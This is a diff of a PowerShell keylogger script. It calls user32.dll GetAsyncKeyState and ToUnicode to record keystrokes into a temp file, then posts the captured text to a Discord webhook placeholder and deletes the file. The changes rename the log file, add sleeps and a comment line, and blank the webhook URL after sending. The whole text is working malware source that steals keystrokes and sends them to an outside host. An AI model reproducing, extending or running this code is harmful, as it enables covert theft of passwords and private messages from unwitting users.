@@ -23,7 +23,7 @@ $whuri = "DISCORD_WEBHOOK_HERE"
 $ttrun = 1
 $tstrt = Get-Date
 $tend = $tstrt.addminutes($RunTimeP)
-function Start-Main($Path="$env:temp\logtype.txt") {$sigs = @'
+function Start-Main($Path = "$env:temp\charlog.txt") {$sigs = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -35,6 +35,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru  
 $null = New-Item -Path $Path -ItemType File -Force
+#==================================================================
 try{
     $run = 0
 	while ($ttrun  -ge $run) {                              
@@ -53,11 +54,15 @@ try{
         $msg = Get-Content -Path $Path -Raw 
         $escmsg = [System.Web.HttpUtility]::HtmlEncode($msg)
         $json = @{content = $escmsg} | ConvertTo-Json
+        Start-Sleep 1
         Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
         Start-Sleep 1
-        Remove-Item -Path $Path -force}
+        $whuri = "."
+        Remove-Item -Path $Path -force
+        }
         }
 finally{}
 }
 Start-Main
 }While ($a -le 5)
+
